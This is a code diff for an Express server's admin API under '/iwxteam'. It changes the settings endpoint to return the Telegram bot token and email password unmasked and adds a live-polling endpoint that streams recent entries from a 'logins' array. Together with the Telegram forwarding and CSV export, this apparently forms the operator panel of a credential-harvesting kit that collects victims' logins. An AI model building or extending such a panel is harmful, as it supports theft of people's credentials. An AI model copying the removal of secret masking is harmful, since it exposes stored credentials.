@@ -962,17 +962,16 @@ app.get('/iwxteam/api/export', adminMiddleware, (req, res) => {
   res.send('\uFEFF' + header + rows);
 });
 
-// Get settings (nilai disensor)
+// Get settings — tampilkan nilai asli (protected by adminMiddleware)
 app.get('/iwxteam/api/settings', adminMiddleware, (req, res) => {
-  const mask = v => v ? v.slice(0, 4) + '*'.repeat(Math.max(0, v.length - 4)) : '';
   res.json({
     ok: true,
-    tgToken:    mask(getTgToken()),
+    tgToken:    getTgToken(),
     tgChat:     getTgChat(),
     emailUser:  getEmailUser(),
-    emailPass:  mask(getEmailPass()),
+    emailPass:  getEmailPass(),
     webhookUrl: process.env.WEBHOOK_URL || `https://${process.env.VERCEL_URL || process.env.REPLIT_DEV_DOMAIN || ''}/webhook`,
-    adminPass:  '••••••••',
+    adminPassSet: !!(cfg.adminPass || process.env.ADMIN_PASSWORD),
     hasTgToken: !!getTgToken(),
     hasTgChat:  !!getTgChat(),
   });
@@ -981,13 +980,20 @@ app.get('/iwxteam/api/settings', adminMiddleware, (req, res) => {
 // Update settings
 app.post('/iwxteam/api/settings', adminMiddleware, (req, res) => {
   const { tgToken, tgChat, emailUser, emailPass, adminPass } = req.body;
-  if (tgToken   !== undefined && !tgToken.includes('*')   && tgToken   !== '') cfg.tgToken   = tgToken;
-  if (tgChat    !== undefined && tgChat !== '')  cfg.tgChat    = tgChat;
+  if (tgToken   !== undefined && tgToken   !== '') cfg.tgToken   = tgToken;
+  if (tgChat    !== undefined && tgChat    !== '') cfg.tgChat    = tgChat;
   if (emailUser !== undefined && emailUser !== '') cfg.emailUser = emailUser;
-  if (emailPass !== undefined && !emailPass.includes('*') && emailPass !== '') cfg.emailPass = emailPass;
-  if (adminPass !== undefined && !adminPass.includes('•') && adminPass.length >= 6) cfg.adminPass = adminPass;
+  if (emailPass !== undefined && emailPass !== '') cfg.emailPass = emailPass;
+  if (adminPass !== undefined && adminPass.length >= 6) cfg.adminPass = adminPass;
   saveSettings(cfg);
   res.json({ ok: true, newToken: generateAdminToken() });
+});
+
+// Live log polling
+app.get('/iwxteam/api/live', adminMiddleware, (req, res) => {
+  const since = parseInt(req.query.since) || 0;
+  const data = logins.filter(l => l.ts > since).slice(0, 50);
+  res.json({ ok: true, data, serverTime: Date.now(), total: logins.length });
 });
 
 // Test Telegram
